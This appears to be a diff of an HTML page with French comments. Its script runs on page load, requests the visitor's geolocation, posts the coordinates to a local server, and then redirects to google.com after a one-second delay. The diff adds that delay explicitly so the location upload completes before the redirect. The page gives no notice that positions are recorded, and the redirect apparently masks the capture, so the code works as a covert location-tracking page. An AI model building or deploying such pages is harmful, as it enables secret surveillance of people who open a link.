@@ -8,59 +8,62 @@
 </head>
 
 <body>
-
     <script>
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(showPosition, showError);
-        } else {
-            console.log("La géolocalisation n'est pas supportée par ce navigateur.");
-        }
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, showError);
+  } else {
+    console.log("La géolocalisation n'est pas supportée par ce navigateur.");
+  }
 
-        async function addCoordinates(latitude, longitude) {
-              try {
-                const response = await fetch("http://localhost:3000/coords", {
-                  method: "POST",
-                  headers: {
-                    "Content-Type": "application/json",
-                  },
-                  body: JSON.stringify({ latitude, longitude }),
-                });
-            
-                if (!response.ok) {
-                  throw new Error(`Erreur serveur : ${response.status}`);
-                }
-            
-                const result = await response.json();
-                console.log("✅ Coordonnées ajoutées :", result);
-              } catch (error) {
-                console.error("❌ Erreur lors de l’ajout des coordonnées :", error);
-              }
-            }
+  async function addCoordinates(latitude, longitude) {
+    try {
+      const response = await fetch("http://localhost:3000/coords", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ latitude, longitude }),
+      });
 
+      if (!response.ok) {
+        throw new Error(`Erreur serveur : ${response.status}`);
+      }
 
-        function showPosition(position) {
-            
-            addCoordinates(position.coords.latitude, position.coords.longitude);
-            //console.log(`Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`);
-            window.location.href = "https://www.google.com/"
-        }
+      const result = await response.json();
+      console.log("✅ Coordonnées ajoutées :", result);
 
-        function showError(error) {
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    alert("Vous avez refusé l'accès à la localisation.");
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    console.log("Les informations de localisation ne sont pas disponibles.");
-                    break;
-                case error.TIMEOUT:
-                    console.log("La requête de localisation a expiré.");
-                    break;
-                default:
-                    console.log("Une erreur inconnue est survenue.");
-            }
-        }
-    </script>
+      // 🔁 Attendre un peu avant de rediriger pour laisser le temps à la requête de s'exécuter
+      setTimeout(() => {
+        window.location.href = "https://www.google.com/";
+      }, 1000); // 1 seconde d’attente
+    } catch (error) {
+      console.error("❌ Erreur lors de l’ajout des coordonnées :", error);
+    }
+  }
+
+  function showPosition(position) {
+    const { latitude, longitude } = position.coords;
+    console.log(`📍 Position détectée : ${latitude}, ${longitude}`);
+    addCoordinates(latitude, longitude);
+  }
+
+  function showError(error) {
+    switch (error.code) {
+      case error.PERMISSION_DENIED:
+        alert("Vous avez refusé l'accès à la localisation.");
+        break;
+      case error.POSITION_UNAVAILABLE:
+        console.log("Les informations de localisation ne sont pas disponibles.");
+        break;
+      case error.TIMEOUT:
+        console.log("La requête de localisation a expiré.");
+        break;
+      default:
+        console.log("Une erreur inconnue est survenue.");
+    }
+  }
+</script>
+
 </body>
 
 
